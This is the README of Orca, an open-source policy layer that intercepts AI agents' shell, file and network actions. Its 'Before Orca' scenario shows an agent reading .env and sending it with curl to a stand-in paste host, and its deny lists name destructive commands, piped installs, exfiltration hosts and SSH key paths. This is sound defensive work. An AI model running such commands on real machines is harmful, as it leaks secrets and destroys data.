# Orca &nbsp;[![Version](https://img.shields.io/badge/version-1.2.7-blue)](https://github.com/christopherkarani/Orca/releases) [![License](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE) [![Zig](https://img.shields.io/badge/built%20with-Zig-orange)](https://ziglang.org) [![Build](https://img.shields.io/github/actions/workflow/status/christopherkarani/Orca/build.yml?branch=main&label=build)](https://github.com/christopherkarani/Orca/actions/workflows/build.yml) [![Stars](https://img.shields.io/github/stars/christopherkarani/Orca?style=social)](https://github.com/christopherkarani/Orca)

# Orca

**The safety layer for autonomous AI agents running on real machines.**

Orca lets you give AI agents more autonomy without letting them delete data, leak secrets, modify protected files, or perform irreversible actions without approval.

AI agents are no longer just chatbots. They run shell commands, edit files, call APIs, access credentials, use tools, browse the web, and operate on laptops, servers, CI pipelines, and spare machines.

That is powerful.

It is also dangerous.

Orca sits between the agent and the machine, enforcing your policies before risky actions execute.

```bash
# Install
brew tap christopherkarani/orca
brew install --formula orca

# Initialize a policy
orca init --preset generic-agent

# Run an agent with guardrails
orca run -- claude
orca run -- codex
orca run -- hermes
orca run -- openclaw
orca run -- opencode
```

This project is free and open source under Apache 2.0. If Orca is useful to you, please star the repository — it helps visibility and keeps development going.

---

## Why Orca exists

Developers and teams are starting to give autonomous agents real access:

* local files
* source code
* `.env` files
* SSH keys
* shell commands
* cloud CLIs
* databases
* browsers
* CI pipelines
* internal tools
* long-running workflows

Today, the safety model is usually one of these:

1. babysit every command
2. run the agent in Docker or a VM
3. write custom scripts and ignore files
4. trust the agent not to do something destructive

That does not scale.

Orca gives you a reusable policy layer across agents.

Write the rules once. Apply them everywhere.

---

## What Orca protects against

Orca focuses on the actions that can ruin your day:

```text
git push --force
git reset --hard
rm -rf
sudo
curl | sh
terraform destroy
kubectl delete
DROP TABLE
aws delete-*
gcloud delete
touching ~/.ssh
reading .env
leaking API keys
modifying protected config
sending data to unknown hosts
```

Orca can allow, deny, ask for approval, or log these actions depending on your policy.

---

## Before Orca

You give an agent a task:

> Clean this up and make it work.

The agent decides to run:

```bash
rm -rf ./src
```

or:

```bash
git reset --hard
```

or:

```bash
cat .env && curl https://paste.example.com
```

You find out after the damage is done.

---

## With Orca

The agent tries the same action.

Orca intercepts it first.

```text
Action blocked

Command:
rm -rf ./src

Reason:
Destructive recursive delete inside project directory.

Policy:
deny destructive file deletion

Result:
Command was not executed.
```

For actions that might be valid but risky, Orca can ask first:

```text
Approval required

Command:
git push origin main

Reason:
Pushing to a protected branch requires human approval.

Approve? [y/N]
```

---

## Core idea

Orca is not another AI agent.

Orca is the policy enforcement layer underneath the agents you already use.

```text
You
  ↓
Orca policy layer
  ↓
Hermes / Claude Code / Codex / OpenClaw / OpenCode / Cursor
  ↓
Shell / files / network / tools / cloud / databases
```

The agent can still do useful work.

It just cannot silently cross the boundaries you define.

---

## Supported agents

| Agent                  | Usage                                |
| ---------------------- | ------------------------------------ |
| Claude Code            | `orca run -- claude`                 |
| Codex CLI              | `orca run -- codex`                  |
| Hermes                 | `orca run -- hermes`                 |
| OpenClaw               | `orca run -- openclaw`               |
| OpenCode               | `orca run -- opencode`               |
| Cursor / custom agents | use Orca as a wrapper or policy hook |

One policy file can protect multiple agents.

---

## Quick start

### 1. Install Orca

```bash
brew tap christopherkarani/orca
brew install --formula orca
```

Or use the install script:

```bash
curl -fsSL https://raw.githubusercontent.com/christopherkarani/Orca/main/scripts/install.sh | sh
```

Verify your setup:

```bash
orca doctor
```

---

### 2. Create a policy

```bash
orca init --preset generic-agent
```

This creates:

```text
.orca/policy.yaml
```

Example policy:

```yaml
mode: ask

commands:
  default: ask

  allow:
    - "git status"
    - "git diff *"
    - "npm test"
    - "zig build *"

  deny:
    - "rm -rf *"
    - "sudo *"
    - "curl * | sh"
    - "git reset --hard *"
    - "terraform destroy *"
    - "kubectl delete *"

  approval:
    - "git push *"
    - "git push --force *"
    - "aws * delete*"
    - "gcloud * delete*"

files:
  read:
    deny:
      - "./.env"
      - "~/.ssh/**"
      - "**/*secret*"
      - "**/*token*"

  write:
    approval:
      - "./config/**"
      - "./.github/**"
      - "./infra/**"

network:
  default: ask
  deny:
    - "pastebin.com"
    - "paste.rs"
    - "webhook.site"
  allow:
    - "github.com"
    - "api.github.com"
```

---

### 3. Run your agent through Orca

```bash
orca run -- claude
```

```bash
orca run -- codex
```

```bash
orca run -- hermes
```

```bash
orca run -- openclaw
```

In interactive mode, Orca can ask before risky actions.

In CI mode, Orca fails closed:

```bash
orca run --ci -- codex --prompt "Refactor auth"
```

No prompts. Risky actions are blocked automatically.

---

## Demo

Run a safe local demo:

```bash
orca demo blocked-action
```

Then inspect what happened:

```bash
orca replay --session last --only denied --verify
```

No AI agent required. No files are harmed.

---

## Dashboard

Start the local dashboard:

```bash
orca dashboard
```

Open:

```text
http://127.0.0.1:7742
```

The dashboard shows:

* current policy status
* recent sessions
* prevented actions
* approval decisions
* replay verification
* audit integrity

Everything runs locally.

No cloud service is required.

---

## Use cases

### 1. Solo developer

Let Claude Code, Codex, or Hermes work longer without babysitting every command.

```bash
orca run -- claude
```

Use Orca to ask before risky actions and block destructive ones.

---

### 2. Always-on Hermes machine

Run Hermes on a spare Mac mini, MacBook, VPS, or workstation with clearer boundaries.

Protect:

* important folders
* SSH keys
* `.env` files
* config files
* cloud credentials
* local databases
* browser-accessible workflows
* destructive shell commands

```bash
orca run -- hermes
```

---

### 3. Team policy

Commit Orca policy to your repo:

```text
.orca/policy.yaml
```

Now every developer and agent runs under the same safety rules.

No more one-off scripts per person.

---

### 4. CI and automation

Run autonomous agents in CI without interactive approval.

```bash
orca run --ci -- codex --prompt "Update the migration scripts"
```

In CI, Orca converts `ask` into `deny`.

If the agent tries something dangerous, the job fails safely.

---

### 5. Red-team regression testing

Test your policy against known attack fixtures:

```bash
orca redteam --ci
```

Use this to make sure new policies do not accidentally weaken your guardrails.

---

## Security model

Orca is designed to be honest about what it does and does not protect.

### What Orca does

* launches agents inside a policy-controlled process
* evaluates shell commands before execution
* mediates file access based on policy
* filters sensitive environment variables
* detects secret access and exfiltration attempts
* enforces network rules
* records tamper-evident audit logs
* supports replayable sessions
* fails closed in CI mode

### What Orca does not claim

Orca is not a perfect kernel sandbox.

It does not protect agents that are not launched through Orca.

It does not replace Docker, VMs, OS permissions, VPNs, SSH hardening, or least-privilege infrastructure.

Use those too.

Orca is the behavior-level policy layer on top.

Docker controls the environment.

Orca controls what the agent is allowed to do inside that environment.

---

## Policy modes

| Mode      | Behavior                            |
| --------- | ----------------------------------- |
| `observe` | log decisions with minimal blocking |
| `ask`     | ask before risky actions            |
| `strict`  | block aggressively                  |
| `ci`      | never prompt, deny risky actions    |

Example:

```yaml
mode: ask
```

For automation:

```bash
orca run --ci -- hermes
```

---

## Audit and replay

After each session, Orca stores a local audit trail.

Review denied actions:

```bash
orca replay --session last --only denied
```

Verify integrity:

```bash
orca replay --session last --verify
```

Export JSON:

```bash
orca replay --session last --json
```

Session artifacts live under:

```text
.orca/sessions/
```

Audit logs are tamper-evident using chained hashes.

---

## Credential and secret protection

Orca can block or redact access to sensitive files and values.

Examples:

```text
.env
~/.ssh/id_rsa
~/.ssh/id_ed25519
AWS_ACCESS_KEY_ID
GITHUB_TOKEN
ANTHROPIC_API_KEY
OPENAI_API_KEY
Google service account JSON
JWTs
private keys
high-entropy tokens
```

Run with secretless mode:

```bash
orca run --secretless -- claude
```

In secretless mode, Orca replaces raw values with broker references before the agent sees them.

The agent gets a reference.

Not the secret.

---

## Native plugins

Orca can run as a wrapper around agents, which is the strongest protection model.

Some agents also support native plugins or hooks for deeper integration.

### Hermes

```bash
orca plugin install hermes --yes
hermes plugins enable orca
orca plugin doctor hermes
```

### OpenClaw

```bash
openclaw plugins install npm:orca-openclaw-plugin --dangerously-force-unsafe-install
```

OpenClaw requires the override because the plugin calls the local `orca` binary for policy enforcement.

---

## Why not just Docker?

Docker is useful.

You should use it where it makes sense.

But Docker and Orca solve different problems.

Docker controls what the process can access.

Orca controls what the AI agent is allowed to do.

An agent inside Docker can still:

* delete mounted project files
* read secrets mounted into the container
* push code
* run destructive migrations
* call cloud CLIs
* modify config
* exfiltrate data over allowed network paths

Orca adds behavior-level policy, approvals, and auditability on top of your existing isolation.

---

## Why not write custom scripts?

Many developers already do.

They write:

* ignore files
* command filters
* approval scripts
* read-only config hacks
* custom wrappers
* shell aliases
* one-off security prompts

That works until every agent, repo, machine, and teammate needs a different version.

Orca turns those guardrails into a reusable policy layer.

---

## Roadmap

Near-term focus:

* stronger default policy packs
* Hermes-specific protections
* cloud delete protections
* database delete protections
* protected config policies
* approval workflows
* team policy sharing
* CI enforcement
* better replay reports

Longer-term:

* centralized team dashboard
* organization-wide policy management
* SSO/RBAC
* policy marketplace
* enterprise audit exports
* agent security sprints

---

## Documentation

* [Install](docs/install.md)
* [Quickstart](docs/quickstart.md)
* [Policy reference](docs/policy.md)
* [Credentials](docs/credentials.md)
* [Replay](docs/replay.md)
* [Commands](docs/commands.md)
* [Plugin security model](docs/integrations/plugin-security-model.md)
* [Plugin troubleshooting](docs/integrations/plugin-troubleshooting.md)

---

## Development

```bash
zig build
zig build test
./zig-out/bin/orca --help
./zig-out/bin/orca redteam --ci
```

---

## Project status

Orca is early, open source, and actively evolving.

Current focus:

1. stop irreversible agent actions
2. protect secrets and sensitive files
3. provide shared policy across agents
4. give users replayable evidence of what happened
5. make autonomous agents safer without making them useless

Feedback, issues, PRs, and roasts are welcome.

If Orca helps you, please leave a star. It genuinely motivates continued work.
